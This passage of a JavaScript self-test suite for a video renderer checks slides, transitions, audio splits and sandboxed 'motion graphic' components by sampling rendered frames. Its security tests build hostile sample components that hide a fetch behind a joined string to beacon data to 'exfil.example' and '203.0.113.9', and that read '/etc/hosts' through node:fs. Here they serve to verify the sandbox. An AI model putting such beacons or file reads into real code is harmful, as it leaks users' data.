const colorBox = (file, frame, name, width, height, tol = 48) => {
  const px = regionPixels(file, frame, WHOLE);
  const want = COLORS[name];
  let n = 0, x0 = width, y0 = height, x1 = -1, y1 = -1;
  for (let y = 0; y < height; y++) {
    for (let x = 0; x < width; x++) {
      const i = (y * width + x) * 3;
      if (i + 2 >= px.length) break;
      if (Math.abs(px[i] - want[0]) <= tol && Math.abs(px[i + 1] - want[1]) <= tol && Math.abs(px[i + 2] - want[2]) <= tol) {
        n++;
        if (x < x0) x0 = x;
        if (x > x1) x1 = x;
        if (y < y0) y0 = y;
        if (y > y1) y1 = y;
      }
    }
  }
  return n
    ? { share: n / (width * height), x0: x0 / width, y0: y0 / height, x1: (x1 + 1) / width, y1: (y1 + 1) / height, w: x1 - x0 + 1, h: y1 - y0 + 1 }
    : { share: 0, x0: 0, y0: 0, x1: 0, y1: 0, w: 0, h: 0 };
};

/** Share of a region's pixels bright enough to be slide text (titles and points, light on the dark background). */
const shareText = (file, frame, box) => {
  const px = regionPixels(file, frame, box);
  let hit = 0;
  const n = Math.floor(px.length / 3);
  for (let i = 0; i < n * 3; i += 3) if (Math.min(px[i], px[i + 1], px[i + 2]) > 150) hit++;
  return n ? hit / n : NaN;
};

// Slides: title (logo), points one by one, code, a diagram on its card, a web
// page in a browser window, the whole page scrolling, the phone picture in a
// phone, and a quote beside a photo, back to back over footage they hide.
const verifySlides = (name, plan, result, outFile) => {
  if (!verifyBasics(name, plan, result, outFile)) return [];
  for (const f of ['logo.svg', 'code.png', 'diagram.svg', 'site-desktop.png', 'site-full.png', 'site-phone.png', 'photo.png']) {
    check(MEDIA_HITS.has(f), `${name}: the render fetched ${f} from the media server`);
  }
  const { width: W, height: H } = plan;
  const ov = Object.fromEntries(plan.overlays.map((x) => [x.id, x]));
  const at = (id, k) => ov[id].from + k;
  const clipAt = (f) => plan.clips.find((c) => c.from <= f && f < c.from + c.durationInFrames)?.assetId;

  // Full-frame slides hide the footage, also where one slide hands over to the next.
  const seams = [...new Set([0, ...plan.overlays.flatMap((x) => [x.from - 1, x.from, x.from + Math.floor(x.durationInFrames / 2)]), plan.durationInFrames - 1])].filter((f) => f >= 0 && f < plan.durationInFrames);
  let worst = 0, worstAt = 0;
  for (const f of seams) {
    const s = shareNear(outFile, f, WHOLE, clipAt(f));
    if (s > worst) [worst, worstAt] = [s, f];
  }
  check(worst < 0.002, `${name}: the slides hide the footage on every frame checked, even between slides (most: ${pctOf(worst)} of frame ${worstAt} is footage-coloured, ${seams.length} frames)`);

  const logo = colorBox(outFile, at('title', 40), 'magenta', W, H);
  const logoLater = shareNear(outFile, at('points', 40), WHOLE, 'magenta');
  check(logo.share > 0.001 && logo.x1 < 0.5 && logo.y1 < 0.35 && logoLater < 0.0005, `${name}: the title slide shows its logo at the top left (${pctOf(logo.share)} of the frame, box to ${logo.x1.toFixed(2)},${logo.y1.toFixed(2)}; on the next slide ${pctOf(logoLater)})`);
  const titleText = shareText(outFile, at('title', 40), [0, 0.2, 1, 0.8]);
  check(titleText > 0.01, `${name}: the title slide sets its title (${pctOf(titleText)} of the middle is text)`);

  // Points appear one by one: the text grows with each.
  const [p1, p2, p3] = [22, 32, 52].map((k) => shareText(outFile, at('points', k), WHOLE));
  check(p2 - p1 > 0.002 && p3 - p2 > 0.002, `${name}: the points appear one by one (text ${pctOf(p1)} → ${pctOf(p2)} → ${pctOf(p3)} of the frame)`);

  const code = colorBox(outFile, at('code', 40), 'magenta', W, H);
  check(code.share > 0.005, `${name}: the code slide shows the code picture (its magenta box is ${pctOf(code.share)} of the frame)`);

  const arch = shareNear(outFile, at('arch', 45), WHOLE, 'cyan');
  const card = shareNear(outFile, at('arch', 45), WHOLE, 'white', 20);
  check(arch > 0.01 && card > 0.03, `${name}: the diagram shows on its light card (diagram colour ${pctOf(arch)}, card ${pctOf(card)} of the frame)`);

  const site = shareNear(outFile, at('site', 40), WHOLE, 'orange');
  check(site > 0.004, `${name}: the desktop page shows in its browser window (its header colour is ${pctOf(site)} of the frame)`);

  const [topEarly, bottomEarly, topLate, bottomLate] = [
    shareNear(outFile, at('full', 14), WHOLE, 'violet'),
    shareNear(outFile, at('full', 14), WHOLE, 'spring'),
    shareNear(outFile, at('full', 56), WHOLE, 'violet'),
    shareNear(outFile, at('full', 56), WHOLE, 'spring'),
  ];
  check(topEarly > 0.01 && bottomEarly < 0.0005, `${name}: the whole page starts at its top (top band ${pctOf(topEarly)}, bottom band ${pctOf(bottomEarly)} of the frame)`);
  check(bottomLate > 0.01 && topLate < 0.0005, `${name}: and scrolls to its bottom by the end (top band ${pctOf(topLate)}, bottom band ${pctOf(bottomLate)})`);

  const phone = colorBox(outFile, at('phone', 40), 'lime', W, H);
  check(phone.share > 0.01 && phone.h > 1.6 * phone.w, `${name}: the phone picture shows in a tall phone frame (${phone.w}x${phone.h} px, ${pctOf(phone.share)} of the frame)`);

  const photo = shareNear(outFile, at('quote', 30), WHOLE, 'yellow');
  const quoteText = shareText(outFile, at('quote', 30), WHOLE);
  check(photo > 0.01 && quoteText > 0.005, `${name}: the quote shows beside its photo (photo ${pctOf(photo)}, text ${pctOf(quoteText)} of the frame)`);

  return extractNamedFrames(outFile, name, [
    [at('title', 8), 'title-enter'],
    [at('title', 40), 'title'],
    [at('points', 22), 'bullets-first'],
    [at('points', 56), 'bullets'],
    [at('code', 8), 'code-enter'],
    [at('code', 40), 'code'],
    [at('arch', 45), 'architecture'],
    [at('site', 40), 'browser'],
    [at('full', 14), 'scroll-top'],
    [at('full', 40), 'scroll-mid'],
    [at('full', 56), 'scroll-bottom'],
    [at('phone', 40), 'phone'],
    [at('quote', 30), 'quote'],
    [at('quote', 44), 'quote-exit'],
  ]);
};

const verifyTransitions = (plan, result, outFile) => {
  check(result.code === 0, `transitions: render.mjs exit code 0 (got ${result.code})`);
  if (result.code !== 0) say(result.stderr.split('\n').slice(-30).join('\n'));
  if (result.code !== 0 || !fs.existsSync(outFile)) return [];
  const v = probe(outFile).streams.find((st) => st.codec_type === 'video');
  check(Math.abs(Number(v?.nb_frames) - plan.durationInFrames) <= 1, `transitions: ${v?.nb_frames} frames vs plan ${plan.durationInFrames}`);
  const c = Object.fromEntries(plan.clips.map((x) => [x.id, x]));
  const mid = (id) => c[id].from + Math.floor(c[id].transitionIn.durationInFrames / 2);
  const frames = [];
  const at = (frame, label, ok, what) => {
    frames.push([frame, label]);
    check(ok, `transitions: ${what} (frame ${frame})`);
  };
  const show = (rgb) => `rgb(${rgb.join(',')})`;
  let rgb = meanColor(outFile, 0, WHOLE);
  at(0, 'fade-in-start', rgb.every((x) => x < 40), `the cut fades in from black: ${show(rgb)}`);
  const dm = meanColor(outFile, mid('dissolve'), WHOLE);
  at(mid('dissolve'), 'dissolve-mid', dm[0] > 80 && dm[0] < 170 && dm[2] > 80 && dm[2] < 170, `dissolve mid-way mixes red and blue: ${show(dm)}`);
  let l = meanColor(outFile, mid('wipe'), LEFT), r = meanColor(outFile, mid('wipe'), RIGHT);
  at(mid('wipe'), 'wipe-left-mid', near(l, 'blue') && near(r, 'green'), `wipe left: the next shot is revealed from the right (left ${show(l)}, right ${show(r)})`);
  const t = meanColor(outFile, mid('slide'), TOP), b = meanColor(outFile, mid('slide'), BOTTOM);
  at(mid('slide'), 'slide-up-mid', near(t, 'green') && near(b, 'red'), `slide up: the next shot comes in from the bottom over a still shot (top ${show(t)}, bottom ${show(b)})`);
  l = meanColor(outFile, mid('push'), LEFT);
  r = meanColor(outFile, mid('push'), RIGHT);
  at(mid('push'), 'push-right-mid', near(l, 'blue') && near(r, 'red'), `push right: the next shot pushes in from the left (left ${show(l)}, right ${show(r)})`);
  rgb = meanColor(outFile, mid('zoom'), WHOLE);
  at(mid('zoom'), 'zoom-mid', rgb[1] > 70 && rgb.some((x) => x > 60), `zoom mid-way shows both shots: ${show(rgb)}`);
  rgb = meanColor(outFile, mid('whip'), WHOLE);
  at(mid('whip'), 'whip-left-mid', rgb[0] > 60 && rgb[1] > 60, `whip mid-way blurs green into red: ${show(rgb)}`);
  rgb = meanColor(outFile, c.white.from, WHOLE);
  at(c.white.from, 'fade-through-white', rgb.every((x) => x > 200), `fade through white is white at the cut: ${show(rgb)}`);
  rgb = meanColor(outFile, c.black.from, WHOLE);
  at(c.black.from, 'fade-through-black', rgb.every((x) => x < 40), `fade through black is black at the cut: ${show(rgb)}`);
  const last = plan.durationInFrames - 1;
  rgb = meanColor(outFile, last, WHOLE);
  at(last, 'fade-out-end', rgb.every((x) => x < 40), `the cut fades out at the end: ${show(rgb)}`);
  // Settled: a frame after each transition is that clip's own color.
  for (const [id, color] of [['wipe', 'green'], ['slide', 'red'], ['push', 'blue'], ['whip', 'red']]) {
    const f = c[id].from + c[id].transitionIn.durationInFrames + 3;
    rgb = meanColor(outFile, f, LEFT);
    at(f, `${id}-settled`, near(rgb, color), `after the ${id} the picture is ${color}: ${show(rgb)}`);
  }
  return frames;
};

/** Per-frame level (dB) of one tone in decoded samples: a Hann-windowed Goertzel per video frame. */
const toneLevels = (x, hz) => {
  const n = 48000 / FPS;
  const out = [];
  const k = Math.cos((2 * Math.PI * hz) / 48000);
  for (let f = 0; (f + 1) * n <= x.length; f++) {
    let s1 = 0, s2 = 0, wsum = 0;
    for (let i = 0; i < n; i++) {
      const w = 0.5 - 0.5 * Math.cos((2 * Math.PI * i) / (n - 1));
      wsum += w;
      const s0 = x[f * n + i] * w + 2 * k * s1 - s2;
      s2 = s1;
      s1 = s0;
    }
    const power = s1 * s1 + s2 * s2 - 2 * k * s1 * s2;
    const amp = (2 * Math.sqrt(Math.max(0, power))) / wsum;
    out.push(20 * Math.log10(Math.max(1e-9, amp)));
  }
  return out;
};

const verifySplits = (plan, result, outFile) => {
  check(result.code === 0, `splits: render.mjs exit code 0 (got ${result.code})`);
  if (result.code !== 0) say(result.stderr.split('\n').slice(-30).join('\n'));
  if (result.code !== 0 || !fs.existsSync(outFile)) return;
  const [, b, cc] = plan.clips;
  const x = samples(outFile, 0, plan.durationInFrames / FPS);
  const red = toneLevels(x, 550), blue = toneLevels(x, 700), green = toneLevels(x, 850);
  const heard = (lv, f) => lv[f] > lv.reduce((m, v) => Math.max(m, v), -200) - 24;
  const first = (lv, a, z) => { for (let f = a; f < z; f++) if (heard(lv, f)) return f; return -1; };
  const last = (lv, a, z) => { for (let f = z - 1; f >= a; f--) if (heard(lv, f)) return f; return -1; };
  const lead = b.from - b.audio.from;
  const blend = b.audio.blendInFrames;
  const carry = b.audio.from + b.audio.durationInFrames - b.audio.blendOutFrames - cc.from;
  const on = first(blue, 0, b.from + 5);
  check(Math.abs(b.from - on - lead) <= 1, `splits: the next shot's sound starts ${b.from - on} frames (${((b.from - on) / FPS).toFixed(2)} s) before its picture (plan: ${lead}, ±1)`);
  const redEnd = last(red, 0, b.from + 10);
  check(redEnd >= on && redEnd <= on + blend, `splits: the outgoing sound fades out over the blend as the next one starts (last heard at ${redEnd}, next starts ${on}, blend ${blend})`);
  const blueEnd = last(blue, b.from, plan.durationInFrames);
  check(Math.abs(blueEnd + 1 - cc.from - carry - b.audio.blendOutFrames) <= 1, `splits: the outgoing sound carries ${blueEnd + 1 - cc.from} frames past the cut (plan: ${carry} full + ${b.audio.blendOutFrames} fading, ±1)`);
  const greenOn = first(green, b.from, plan.durationInFrames);
  check(Math.abs(greenOn - cc.from - carry) <= 1, `splits: the next shot's own sound starts ${greenOn - cc.from} frames (${((greenOn - cc.from) / FPS).toFixed(2)} s) after its picture (plan: ${carry}, ±1)`);
  check(last(blue, 0, b.from - lead - 1) < 0 && first(green, 0, cc.from) < 0, 'splits: no sound plays outside its window');
};

/** Audio samples (mono f32) of the output between two times. */
const samples = (file, from, to) => {
  const r = spawnSync(FFMPEG, ['-hide_banner', '-loglevel', 'error', '-ss', String(from), '-t', String(to - from), '-i', file, '-vn', '-ac', '1', '-ar', '48000', '-f', 'f32le', '-'], { maxBuffer: 64 << 20 });
  const b = r.stdout ?? Buffer.alloc(0);
  return new Float32Array(b.buffer, b.byteOffset, Math.floor(b.length / 4));
};

/** The largest sample-to-sample jump around a time, and the high-frequency energy there. */
const clickAt = (file, t) => {
  const x = samples(file, t - 0.05, t + 0.05);
  let jump = 0;
  for (let i = 1; i < x.length; i++) jump = Math.max(jump, Math.abs(x[i] - x[i - 1]));
  const r = spawnSync(FFMPEG, ['-hide_banner', '-ss', String(t - 0.03), '-t', '0.06', '-i', file, '-vn', '-af', 'highpass=f=4000,highpass=f=4000,volumedetect', '-f', 'null', '-'], { encoding: 'utf8' });
  const m = /mean_volume:\s*(-?[\d.]+) dB/.exec(r.stderr ?? '');
  return { jump, hf: m ? Number(m[1]) : NaN };
};

const CLICKS = {};
const verifyCut = (name, plan, result, outFile) => {
  check(result.code === 0, `${name}: render.mjs exit code 0 (got ${result.code})`);
  if (result.code !== 0) say(result.stderr.split('\n').slice(-30).join('\n'));
  if (result.code !== 0 || !fs.existsSync(outFile)) return;
  const cut = plan.clips[1].from / FPS;
  CLICKS[name] = { cut: clickAt(outFile, cut), steady: clickAt(outFile, cut - 0.5) };
  say(`  ${name}: sample jump ${CLICKS[name].cut.jump.toFixed(3)} at the cut (steady tone ${CLICKS[name].steady.jump.toFixed(3)}), high-frequency energy ${CLICKS[name].cut.hf} dB (steady ${CLICKS[name].steady.hf} dB)`);
};

const VARIANTS = {
  vertical: { width: 1080, height: 1920, platform: 'shorts', variant: 'vertical' },
  landscape: { width: 1920, height: 1080, platform: 'youtube', variant: 'landscape' },
  square: { width: 1080, height: 1080, platform: 'generic', variant: 'square' },
};

// Frames to review, by what they show.
const REVIEW_FRAMES = [
  [12, 'title-enter'],
  [48, 'title'],
  [112, 'caption-emphasis+lowerthird-clean'],
  [150, 'lowerthird-clean+caption'],
  [202, 'crossfade-mid'],
  [262, 'quote-revealing'],
  [318, 'quote-full'],
  [365, 'caption-over-bright-letterbox'],
  [399, 'dip-to-black'],
  [470, 'cinematic+caption'],
  [540, 'datacard-counting'],
  [585, 'datacard'],
  [660, 'endcard'],
];

// --- project motion graphics (D68–D70) --------------------------------------
const MOTION_DIR = path.join(OUT, 'motion');
const routeMap = () => makeArchive(path.join(VIDEO_DIR, 'render', 'fixtures', 'motion', 'route-map'), MOTION_DIR);

/** A vertical plan: one clip of footage (optional) and one motion graphic. */
const motionPlan = (baseUrl, hash, { params, from = 30, dur = 120, total = 180, clip = true, name = 'route-map' } = {}) => ({
  schemaVersion: 1, revisionId: 'rev_selftest_motion', projectId: 'prj_selftest', specHash: 'selftest-motion', media: 'original',
  width: 1080, height: 1920, fps: FPS, durationInFrames: total, background: '#000000',
  brand: { primary: '#F2EDE4', accent: '#E0A458', text: '#F7F5F0', background: '#0B0B0E', font: 'Inter' },
  safeArea: { top: 192, bottom: 384, left: 64, right: 129 },
  clips: clip
    ? [{ id: 'c1', assetId: 'portrait', from: 0, durationInFrames: total, trimBefore: 30, sourceIn: 1, sourceOut: 1 + total / FPS, playbackRate: 1, volume: 1, muted: false,
        hasAudio: true, sourceWidth: 1080, sourceHeight: 1920, framing: { mode: 'fill', focusX: 0.5, focusY: 0.5, zoom: 1 }, transitionIn: { type: 'cut', durationInFrames: 0 }, fadeOutFrames: 0 }]
    : [],
  audio: [], dialogueRanges: [],
  overlays: [{ id: 'route', template: '', templateVersion: '', from, durationInFrames: dur, params: params ?? { from: 'Lisbon', to: 'Porto' }, motion: { name, hash, region: 'center' } }],
  sources: clip ? { portrait: `${baseUrl}/portrait.mp4` } : {},
});

const renderPlan = async (tag, plan, extra = [], env) => {
  fs.mkdirSync(MOTION_DIR, { recursive: true });
  const propsFile = path.join(MOTION_DIR, `plan-${tag}.json`);
  fs.writeFileSync(propsFile, JSON.stringify({ plan }, null, 2));
  const outFile = path.join(MOTION_DIR, `out-${tag}.mp4`);
  const t0 = Date.now();
  const r = await runNode('render.mjs', ['--props', propsFile, '--out', outFile, '--bundle-cache', path.join(VIDEO_DIR, '.bundle-cache'), '--concurrency', '2', ...extra], env);
  r.seconds = (Date.now() - t0) / 1000;
  r.outFile = outFile;
  r.last = r.lines[r.lines.length - 1];
  r.blocked = r.lines.find((l) => l.type === 'blocked')?.hosts ?? [];
  return r;
};

/** The RGB pixels of a region (fractions) of one frame. */
const regionPixels = (file, frame, [x0, y0, x1, y1]) => {
  const r = spawnSync(
    FFMPEG,
    ['-hide_banner', '-loglevel', 'error', '-i', file, '-vf', `select=eq(n\\,${frame}),crop=trunc(iw*${x1 - x0}):trunc(ih*${y1 - y0}):trunc(iw*${x0}):trunc(ih*${y0})`, '-frames:v', '1', '-f', 'rawvideo', '-pix_fmt', 'rgb24', '-'],
    { maxBuffer: 1 << 26 },
  );
  return r.stdout ?? Buffer.alloc(0);
};

/**
 * How a region of a rendered frame differs from the same frame of the footage it
 * shows (same size, no reframing): the mean per-channel difference (0-255) and the
 * share of pixels that became near-white (a graphic's text), whatever the footage
 * looks like and however it moves.
 */
const overFootage = (render, frame, footage, footageFrame, box) => {
  const a = regionPixels(render, frame, box);
  const b = regionPixels(footage, footageFrame, box);
  const n = Math.min(a.length, b.length) - (Math.min(a.length, b.length) % 3);
  let sum = 0;
  let light = 0;
  for (let i = 0; i < n; i += 3) {
    sum += Math.abs(a[i] - b[i]) + Math.abs(a[i + 1] - b[i + 1]) + Math.abs(a[i + 2] - b[i + 2]);
    if (Math.min(a[i], a[i + 1], a[i + 2]) > 215 && Math.min(b[i], b[i + 1], b[i + 2]) <= 215) light++;
  }
  const px = n / 3;
  return { diff: px ? sum / (px * 3) : NaN, light: px ? light / px : NaN, ok: px > 0 && a.length === b.length };
};

/** When a motion check fails: what the render couldn't reach or find, so the cause is visible. */
const explainMotion = (r) => {
  say(`  blocked by the network jail: ${JSON.stringify(r.blocked)}`);
  say(`  asked of the media server but missing: ${JSON.stringify([...new Set(MEDIA_MISSES)])}`);
  const notes = (r.stderr ?? '').split('\n').filter((l) => /blocked|fail|error|not found|404|font|timeout/i.test(l)).slice(-20);
  say(`  render messages about blocked, missing or failed things: ${notes.length ? `\n    ${notes.join('\n    ')}` : 'none'}`);
  say(`  frames to look at: ${path.join(FRAMES, 'motion-*')}`);
};

const runMotion = async (baseUrl) => {
  const a = routeMap();
  const plan = motionPlan(baseUrl, a.hash);
  say(`rendering motion (route-map ${a.hash.slice(0, 8)}) ${plan.width}x${plan.height}, ${plan.durationInFrames} frames`);
  const r = await renderPlan('motion', plan, ['--motion', `${a.hash}=${a.file}`, '--frame-timeout-ms', '30000', '--max-seconds', '300']);
  check(r.code === 0, `motion: render.mjs exit code 0 (got ${r.code}, ${r.seconds.toFixed(1)}s)`);
  if (r.code !== 0) say(r.stderr.split('\n').slice(-30).join('\n'));
  check(r.last?.type === 'done' && r.last.motion?.[0]?.hash === a.hash && r.last.motion[0].bundleBytes > 0, `motion: done names the version it drew (${JSON.stringify(r.last?.motion)})`);
  check(r.blocked.length === 0, `motion: an honest component reaches for nothing (blocked: ${JSON.stringify(r.blocked)})`);
  if (r.code !== 0 || !fs.existsSync(r.outFile)) return [];
  const v = probe(r.outFile).streams.find((st) => st.codec_type === 'video');
  check(Math.abs(Number(v?.nb_frames) - plan.durationInFrames) <= 1, `motion: ${v?.nb_frames} frames vs plan ${plan.durationInFrames}`);
  // The "Lisbon" label and the start dot appear over the footage while the graphic is on (frames
  // 30-149), and only then. Each frame is compared with the same frame of the footage, because the
  // footage itself changes from frame to frame.
  const label = [0.08, 0.53, 0.24, 0.6];
  const footage = path.join(MEDIA, 'portrait.mp4');
  const src = (n) => plan.clips[0].trimBefore + n; // plays at 1x, same size, no reframing
  const [before, during, after] = [20, 100, 165].map((n) => overFootage(r.outFile, n, footage, src(n), label));
  const pct = (x) => `${(x * 100).toFixed(1)}%`;
  const drawn = before.ok && during.ok && after.ok && before.diff < 8 && after.diff < 8 && during.diff > before.diff + 8 && during.light > 0.02;
  check(
    drawn,
    `motion: the graphic draws over the footage, and only while it is on (label area vs the footage: ${before.diff.toFixed(1)} → ${during.diff.toFixed(1)} → ${after.diff.toFixed(1)}; new light pixels ${pct(before.light)} → ${pct(during.light)} → ${pct(after.light)})`,
  );
  if (!drawn) explainMotion(r);
  // The arc is the brand accent where it peaks.
  const apex = meanColor(r.outFile, 100, [0.44, 0.349, 0.5, 0.354]);
  check(apex[0] > 150 && apex[1] > 100 && apex[2] < 140, `motion: the line is the brand accent at its peak (rgb(${apex.join(',')}))`);
  return extractNamedFrames(r.outFile, 'motion', [[20, 'before'], [45, 'drawing'], [100, 'drawn'], [160, 'after']]);
};

// A project motion graphic that draws the cut's resources (D107): the logo by
// a name in quotes and a picture through a parameter marked as a resource,
// served by hash from the media server like any template's.
const RESOURCE_COMPONENT = {
  'index.tsx': `import { AbsoluteFill } from 'remotion';
import { z } from 'zod';
import { ResourceImage, fitInside, useResource, type MotionMeta, type MotionProps } from '@metarush/motion';

export const schema = z.object({ shot: z.string().meta({ format: 'metarush-resource' }) });
export const meta: MotionMeta = { summary: 'A picture with the logo on it.', region: 'full', minDuration: 1, maxDuration: 6 };

export default function Graphic({ params, layout }: MotionProps<typeof schema>) {
  const logo = useResource('logo');
  const shot = useResource(params.shot);
  const box = logo ? fitInside(logo, layout.width * 0.6, layout.height * 0.2) : null;
  return (
    <AbsoluteFill>
      {shot ? <ResourceImage pic={shot} fit="cover" style={{ width: '100%', height: '100%' }} /> : null}
      {logo && box ? (
        <AbsoluteFill style={{ alignItems: 'center', justifyContent: 'center' }}>
          <ResourceImage pic={logo} style={{ width: box.width, height: box.height }} />
        </AbsoluteFill>
      ) : null}
    </AbsoluteFill>
  );
}
`,
  'preview.json': '{"shot": "photo"}',
};

const runMotionResources = async (baseUrl) => {
  const a = makeArchive(RESOURCE_COMPONENT, path.join(MOTION_DIR, 'resources'));
  const plan = motionPlan(baseUrl, a.hash, { params: { shot: 'photo' }, from: 30, dur: 60, total: 120, name: 'logo-over-photo' });
  plan.overlays[0].motion.region = 'full';
  // The resources block and file addresses exactly as Go writes them for a cut that pins logo and photo.
  const pins = GO_PLANS.plans.resources.resources;
  plan.resources = { logo: pins.logo, photo: pins.photo };
  plan.resourceSources = Object.fromEntries([pins.logo.sha256, pins.photo.sha256].map((sha) => [sha, `${baseUrl}/${GO_PLANS.resources[sha]}`]));
  say(`rendering motion-resources (${a.hash.slice(0, 8)}) ${plan.width}x${plan.height}, ${plan.durationInFrames} frames`);
  MEDIA_HITS.clear();
  const r = await renderPlan('motion-resources', plan, ['--motion', `${a.hash}=${a.file}`, '--frame-timeout-ms', '30000', '--max-seconds', '300']);
  check(r.code === 0, `motion-resources: render.mjs exit code 0 (got ${r.code}, ${r.seconds.toFixed(1)}s)`);
  if (r.code !== 0) say(r.stderr.split('\n').slice(-30).join('\n'));
  check(r.blocked.length === 0, `motion-resources: the network jail blocked nothing (blocked: ${JSON.stringify(r.blocked)})`);
  for (const f of ['logo.svg', 'photo.png']) check(MEDIA_HITS.has(f), `motion-resources: the render fetched ${f} from the media server`);
  if (r.code !== 0 || !fs.existsSync(r.outFile)) {
    explainMotion(r);
    return [];
  }
  // While the graphic is on (frames 30-89) the photo (yellow) fills the frame and the logo
  // (magenta) sits in the middle; before and after, the footage shows neither.
  const middle = [0.2, 0.4, 0.8, 0.6];
  const [before, during, after] = [15, 60, 105].map((n) => [shareNear(r.outFile, n, WHOLE, 'yellow'), shareNear(r.outFile, n, middle, 'magenta')]);
  check(during[0] > 0.4 && before[0] < 0.01 && after[0] < 0.01, `motion-resources: the picture named by a parameter fills the frame only while the graphic is on (yellow ${pctOf(before[0])} → ${pctOf(during[0])} → ${pctOf(after[0])})`);
  check(during[1] > 0.05 && before[1] < 0.002 && after[1] < 0.002, `motion-resources: the logo named in quotes is drawn on it (magenta ${pctOf(before[1])} → ${pctOf(during[1])} → ${pctOf(after[1])} of the middle)`);
  return extractNamedFrames(r.outFile, 'motion-resources', [[15, 'before'], [60, 'drawn'], [105, 'after']]);
};

/** A loopback "outside" server: anything reaching it is a leak. */
const startSink = () =>
  new Promise((resolve) => {
    const hits = [];
    const srv = http.createServer((req, res) => {
      hits.push(req.url);
      res.writeHead(200, { 'Content-Type': 'audio/mpeg', 'Access-Control-Allow-Origin': '*' }).end('x');
    });
    srv.listen(0, '127.0.0.1', () => resolve({ url: `http://127.0.0.1:${srv.address().port}`, port: srv.address().port, hits, close: () => srv.close() }));
  });

/**
 * The browsers whose profile sits under dir. Remotion makes the profile in the
 * render's temp directory, so a render given its own TMPDIR can be told apart
 * from browsers other test runs on the machine have open.
 */
const chromePids = (dir) => {
  const r = spawnSync('/bin/ps', ['-axo', 'pid=,command='], { encoding: 'utf8' });
  return (r.stdout ?? '').split('\n').filter((l) => /chrome-headless-shell/.test(l) && l.includes(path.join(dir, 'puppeteer_dev_chrome_profile'))).map((l) => l.trim().split(/\s+/)[0]);
};

const runMotionSecurity = async (baseUrl) => {
  const sink = await startSink();
  try {
    // 1. Network: obfuscated lookups get past the import scan, and still reach nothing.
    const exfil = makeArchive(
      component({
        imports: "import { useEffect } from 'react';",
        top: 'const g = globalThis as unknown as Record<string, (u: string) => Promise<unknown>>;\nconst net = g[["fe", "tch"].join("")]!;',
        body: `useEffect(() => {
    void net(params.label + '/leak?f=' + frame).catch(() => {});
    void net('http://exfil.example/leak?f=' + frame).catch(() => {});
    void net('https://203.0.113.9/leak').catch(() => {});
    const img = new Image();
    img.src = params.label + '/pixel.gif?f=' + frame;
  }, []);
  return <AbsoluteFill style={{ background: '#204060' }} />;`,
      }),
      path.join(MOTION_DIR, 'exfil'),
    );
    const plan = motionPlan(baseUrl, exfil.hash, { params: { label: sink.url }, from: 0, dur: 30, total: 30, clip: false, name: 'exfil' });
    let r = await renderPlan('exfil', plan, ['--motion', `${exfil.hash}=${exfil.file}`, '--frame-timeout-ms', '20000']);
    check(r.code === 0, `security: a component that tries the network still renders (exit ${r.code})`);
    if (r.code !== 0) say(r.stderr.split('\n').slice(-20).join('\n'));
    check(sink.hits.length === 0, `security: nothing reached the outside server (${sink.hits.length} request(s): ${sink.hits.slice(0, 3).join(', ')})`);
    check(r.blocked.includes(`127.0.0.1:${sink.port}`) && r.blocked.includes('exfil.example') && r.blocked.some((h) => h.startsWith('203.0.113.9')),
      `security: the blocked attempts are reported (${JSON.stringify(r.blocked)})`);

    // 2. Node never downloads for the page: an audio source pointing elsewhere fails the render.
    const audio = makeArchive(
      component({ imports: "import { Html5Audio } from 'remotion';", body: "return <Html5Audio src={params.label + '/a.mp3'} />;" }),
      path.join(MOTION_DIR, 'audio'),
    );
    // A generous frame limit: on a busy machine the first frame can take over a minute, and this check is about the
    // download (refused at once when it works), not the limit.
    r = await renderPlan('audio', motionPlan(baseUrl, audio.hash, { params: { label: sink.url }, from: 0, dur: 30, total: 30, clip: false, name: 'audio' }), ['--motion', `${audio.hash}=${audio.file}`, '--frame-timeout-ms', '180000']);
    check(r.code === 1 && /blocked a download/i.test(r.last?.message ?? ''), `security: Node refuses to fetch audio the page names (${r.last?.message?.slice(0, 120)})`);
    check(sink.hits.length === 0, `security: still nothing reached the outside server (${sink.hits.length})`);

    // 3. A component stuck in a loop is stopped by the per-frame limit, and its browser goes with it.
    const stuckTmp = fs.mkdtempSync(path.join(MOTION_DIR, 'stuck-tmp-'));
    const stuck = makeArchive(component({ body: 'while (frame >= 0) { /* never returns */ }\n  return null;' }), path.join(MOTION_DIR, 'stuck'));
    let seen = 0;
    const look = setInterval(() => (seen = Math.max(seen, chromePids(stuckTmp).length)), 1000);
    r = await renderPlan('stuck', motionPlan(baseUrl, stuck.hash, { params: { label: 'x' }, from: 0, dur: 30, total: 30, clip: false, name: 'stuck' }), ['--motion', `${stuck.hash}=${stuck.file}`, '--frame-timeout-ms', '8000'], { TMPDIR: stuckTmp });
    clearInterval(look);
    check(seen > 0, 'security: the stuck render\'s browser can be told apart while it runs (so the next check means something)');
    check(r.code === 1 && r.seconds < 60 && /timeout|timed out|time limit|no frame was finished/i.test(r.last?.message ?? ''), `security: a stuck component is stopped (exit ${r.code} after ${r.seconds.toFixed(1)}s: ${r.last?.message?.slice(0, 100)})`);
    await new Promise((res) => setTimeout(res, 1500));
    const left = chromePids(stuckTmp);
    check(left.length === 0, `security: no browser is left running after it (${left.length})`);

    // 4. The total time limit.
    const a = routeMap();
    r = await renderPlan('slow', motionPlan(baseUrl, a.hash), ['--motion', `${a.hash}=${a.file}`, '--max-seconds', '2']);
    check(r.code === 1 && r.last?.code === 'time_limit', `security: the total time limit stops a render (${r.last?.message})`);

    // 5. The bundle size limit.
    r = await renderPlan('big', motionPlan(baseUrl, a.hash), ['--motion', `${a.hash}=${a.file}`, '--max-bundle-bytes', '60000']);
    check(r.code === 1 && /bundle is .* the limit is/.test(r.last?.message ?? ''), `security: the bundle size limit refuses a render (${r.last?.message})`);

    // 6. A forbidden import in an archive never renders (the renderer scans again).
    const evil = makeArchive(component({ imports: "import { readFileSync } from 'node:fs';", body: "return <div>{String(readFileSync('/etc/hosts'))}</div>;" }), path.join(MOTION_DIR, 'evil'));
    r = await renderPlan('evil', motionPlan(baseUrl, evil.hash, { clip: false, name: 'evil' }), ['--motion', `${evil.hash}=${evil.file}`]);
    check(r.code === 1 && /problem.*index\.tsx:4.*Node\.js/.test(r.last?.message ?? ''), `security: a forbidden import is refused at render time (${r.last?.message?.slice(0, 140)})`);

    // 7. An archive that isn't the version the plan names is refused.
    r = await renderPlan('mismatch', motionPlan(baseUrl, a.hash), ['--motion', `${a.hash}=${evil.file}`]);
    check(r.code === 1 && /is not version/.test(r.last?.message ?? ''), `security: a mismatched archive is refused (${r.last?.message?.slice(0, 120)})`);

    // 8. A plan naming a motion graphic without its archive is refused.
    r = await renderPlan('missing', motionPlan(baseUrl, a.hash), []);
